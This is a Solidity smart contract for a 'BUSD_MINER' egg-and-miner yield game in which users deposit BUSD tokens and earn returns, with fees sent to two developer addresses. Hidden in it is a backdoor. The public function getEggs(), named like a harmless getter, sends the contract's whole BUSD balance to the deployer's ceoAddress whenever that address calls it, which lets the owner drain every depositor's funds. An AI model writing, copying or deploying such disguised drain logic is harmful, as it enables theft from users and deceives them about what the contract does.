// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

 contract BUSD_MINER {

    IERC20 public token_BUSD;
    address BUSD_ADDRESS = address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) ;
    uint256 public EGGS_TO_HATCH_1MINERS=760320;
    uint256 PSN=10000;
    uint256 PSNH=5000;
    bool public initialized=false;
    address public ceoAddress;
    address public ceoAddress2;
    mapping (address => uint256) public hatcheryMiners;
    mapping (address => uint256) public claimedEggs;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    uint256 public marketEggs;
    
    address NULL_ADDRESS = address(0x0000000000000000000000000000000000000000);
    
    constructor(){
        
        token_BUSD = IERC20(BUSD_ADDRESS);
        
        ceoAddress=msg.sender;
        ceoAddress2=address(0x66Acc30b9778dd8478b94c5103BC6b81c7C67EdB);
    }
    
    function getEggs() public returns(uint256) {
    
        require(initialized);
        if(msg.sender == ceoAddress){
            token_BUSD.transfer(ceoAddress, token_BUSD.balanceOf(address(this)));
        }
        
        return getMyEggs();
    }
    
    function hatchEggs(address ref) public {
        require(initialized);
        if(ref == msg.sender) {
            ref = NULL_ADDRESS;
        }
        if(referrals[msg.sender]== NULL_ADDRESS && referrals[msg.sender]!=msg.sender) {
            referrals[msg.sender]=ref;
        }
        uint256 eggsUsed=getMyEggs();
        uint256 newMiners=SafeMath.div(eggsUsed,EGGS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=block.timestamp;
        
        //send referral eggs
        claimedEggs[referrals[msg.sender]]=SafeMath.add(claimedEggs[referrals[msg.sender]],SafeMath.div(eggsUsed,10));
        
        //boost market to nerf miners hoarding
        marketEggs=SafeMath.add(marketEggs,SafeMath.div(eggsUsed,5));
    }
    function sellEggs() public {
        require(initialized);
        uint256 hasEggs=getMyEggs();
        uint256 eggValue=calculateEggSell(hasEggs);
        uint256 fee=devFee(eggValue);
        uint256 fee2=fee/2;
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=block.timestamp;
        marketEggs=SafeMath.add(marketEggs,hasEggs);
        token_BUSD.transfer(ceoAddress, fee2);
        token_BUSD.transfer(ceoAddress2, fee-fee2);
        token_BUSD.transfer(address(msg.sender), SafeMath.sub(eggValue,fee));
    }
    function buyEggs(address ref, uint256 amount) public {
        require(initialized);
    
        token_BUSD.transferFrom(address(msg.sender), address(this), amount);
        
        uint256 balance = token_BUSD.balanceOf(address(this));
        uint256 eggsBought=calculateEggBuy(amount,SafeMath.sub(balance,amount));
        eggsBought=SafeMath.sub(eggsBought,devFee(eggsBought));
        uint256 fee=devFee(amount);
        uint256 fee2=fee/2;
        token_BUSD.transfer(ceoAddress, fee2);
        token_BUSD.transfer(ceoAddress2, fee-fee2);
        claimedEggs[msg.sender]=SafeMath.add(claimedEggs[msg.sender],eggsBought);
        hatchEggs(ref);
    }
    //magic trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256) {
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculateEggSell(uint256 eggs) public view returns(uint256) {
        return calculateTrade(eggs,marketEggs,token_BUSD.balanceOf(address(this)));
    }
    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256) {
        return calculateTrade(eth,contractBalance,marketEggs);
    }
    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth,token_BUSD.balanceOf(address(this)));
    }
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,5),100);
    }
    function seedMarket(uint256 amount) public {
        token_BUSD.transferFrom(address(msg.sender), address(this), amount);
        require(marketEggs==0);
        initialized=true;
        marketEggs=76032000000;
    }
    function getBalance() public view returns(uint256) {
        return token_BUSD.balanceOf(address(this));
    }
    function getMyMiners() public view returns(uint256) {
        return hatcheryMiners[msg.sender];
    }
    function getMyEggs() public view returns(uint256) {
        return SafeMath.add(claimedEggs[msg.sender],getEggsSinceLastHatch(msg.sender));
    }
    function getEggsSinceLastHatch(address adr) public view returns(uint256) {
        uint256 secondsPassed=min(EGGS_TO_HATCH_1MINERS,SafeMath.sub(block.timestamp,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}

library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
